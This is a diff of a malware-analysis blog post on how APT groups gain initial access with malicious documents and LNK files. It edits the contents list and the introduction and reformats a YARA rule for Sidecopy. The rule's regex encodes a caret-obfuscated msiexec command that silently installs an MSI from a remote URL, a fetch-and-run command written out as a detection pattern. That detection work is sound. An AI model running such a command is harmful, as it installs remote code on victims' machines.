@@ -15,16 +15,17 @@ categories: ["Non-PE Malware"]
     - Case 4 : Sidecopy using lnk to drop malicious msi file
 - YARA Rule.
     - Detecting Maldoc.
-    - Detecting LNK.
+    - Detecting LNK of Kimsuky
     - Detecting HTA.
+    - Detecting LNK of Sidecopy
 - IOCs.
 - Limitations.
-- MITRE ATT&CK.
+- References
 
 ## Introduction
 ![image](https://github.com/user-attachments/assets/b975d5f5-9074-4bd4-b747-efbaaa380ffd)
 
-I recently started learning about maldoc analysis as part of my malware analysis journey. During this process, I explored different APT groups, including SideWinder( 🇮🇳 ), Kimsuky ( 🇰🇵 ) , and Gamaredon ( 🇷🇺 ). I analyzed their samples, focusing on how they gain initial access. To conduct my research, I used platforms like VirusTotal, Twitter, and MalwareBazaar to find and study real-world malware samples.So, I am writing this blog which contains my findings for the same.
+I recently started learning about maldoc analysis as part of my malware analysis journey. During this process, I explored different APT groups, including SideWinder( 🇮🇳 ), Kimsuky ( 🇰🇵 ) , Sidecopy ( 🇵🇰 ) , and Gamaredon ( 🇷🇺 ). I analyzed their samples, focusing on how they gain initial access. To conduct my research, I used platforms like VirusTotal, Twitter, and MalwareBazaar to find and study real-world malware samples.So, I am writing this blog which contains my findings for the same.
 
 ## Motivation
 
@@ -235,7 +236,7 @@ I am learning YARA rules for the first time, so I have written this rule to dete
             Description = "This rule is to detect malicious lnk file of Sidecopy "
     
         strings:
-            $cmd_args =                                                 /\/c\s*m\^s\^i\^e\^x\^e\^c\.exe\s*\/q\s*\/i\s*h\^t\^t\^p\^s\^:\^\/\^\/\^n\^h\^p\^\.\^m\^o\^w\^r\^\.\^g\^o\^v\^\.\^i\^n\^\/\^N\^H\^P\^M\^I\^S\^\/\^T\^r\^a\^i\^n\^i\^n\^g\^M\^a\^t\^e\^r\^i\^a\^l\^\/\^a\^s\^p\^x\^\/\^S\^e\^c\^u\^r\^i\^t\^y\^\-\^G\^u\^i\^d\^e\^l\^i\^n\^e\^s\^\/\^w\^o\^n\^t\^\//i
+            $cmd_args =  /\/c\s*m\^s\^i\^e\^x\^e\^c\.exe\s*\/q\s*\/i\s*h\^t\^t\^p\^s\^:\^\/\^\/\^n\^h\^p\^\.\^m\^o\^w\^r\^\.\^g\^o\^v\^\.\^i\^n\^\/\^N\^H\^P\^M\^I\^S\^\/\^T\^r\^a\^i\^n\^i\^n\^g\^M\^a\^t\^e\^r\^i\^a\^l\^\/\^a\^s\^p\^x\^\/\^S\^e\^c\^u\^r\^i\^t\^y\^\-\^G\^u\^i\^d\^e\^l\^i\^n\^e\^s\^\/\^w\^o\^n\^t\^\//i
     
         condition:
             $cmd_args
